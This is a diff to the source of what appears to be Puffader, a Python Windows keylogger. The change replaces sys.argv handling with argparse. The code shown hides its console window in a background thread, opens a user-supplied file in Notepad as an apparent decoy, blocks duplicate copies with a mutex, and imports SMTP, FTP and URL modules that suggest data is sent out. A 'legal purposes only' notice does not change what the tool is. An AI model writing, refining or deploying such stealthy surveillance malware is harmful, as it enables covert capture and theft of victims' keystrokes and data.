@@ -8,7 +8,7 @@ MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
 NOTE: This program must be used for legal purposes only!
 '''
 
-import smtplib, time, os, threading, sys, subprocess
+import smtplib, time, os, threading, sys, subprocess, argparse
 import win32console, win32gui, win32event, win32api, winerror
 from sys import exit; from ftplib import FTP; from urllib2 import urlopen
 try:
@@ -45,9 +45,15 @@ def hide():
 # hide window as new thread. Necessary in order to define timer used later
 objTimer = threading.Timer(0, hide);objTimer.start()
 
+parser = argparse.ArgumentParser()
+
+parser.add_argument("file", nargs="?", default=None)
+
+args = parser.parse_args()
+
 # open file in notepad if argument is given
-if len(sys.argv) == 2:
-    OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", sys.argv[1]])
+if args.file:
+    OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", args.file])
 
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
